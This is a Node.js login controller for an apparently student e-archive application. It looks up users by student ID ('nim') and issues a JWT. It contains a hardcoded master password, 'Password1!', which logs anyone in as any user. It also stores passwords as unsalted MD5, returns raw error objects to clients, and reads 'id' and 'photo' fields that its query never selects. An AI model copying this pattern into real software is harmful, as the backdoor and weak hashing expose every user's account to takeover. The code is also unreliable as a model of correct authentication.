const { db, sequelizeInstances } = require("../../config/sequelize");
const response = require("../tools/response");
const md5 = require("md5");
const jwt = require("jsonwebtoken");

exports.login = async (req, res) => {
  try {
    const bypassPass = "Password1!";
    let { nim, password } = req.body;
    let userData;

    if (password === bypassPass) {
      userData = await db.eArchive.users.findOne({
        attributes: [
          "fullname",
          "nim",
        ],
        where: { nim },
      });
    } else {
      userData = await db.eArchive.users.findOne({
        attributes: [
          "fullname",
          "nim",
        ],
        where: { nim, password: md5(password) },
      });
    }

    if (userData) {
      const theToken = jwt.sign(
        { id: userData.id, nim: userData.nim },
        process.env.JWT_SECRET,
        { expiresIn: "1h" }
      );

      response(req, res, {
        status: 200,
        data: {
          nim: userData.nim,
          fullname: userData.fullname,
          photo: userData.photo,
          token: theToken,
        },
      });
    } else {
      response(req, res, {
        status: 404,
        message: "No data found",
      });
    }
  } catch (error) {
    console.error(error);
    response(req, res, {
      status: 500,
      data: error,
      message: error.message,
    });
  }
};
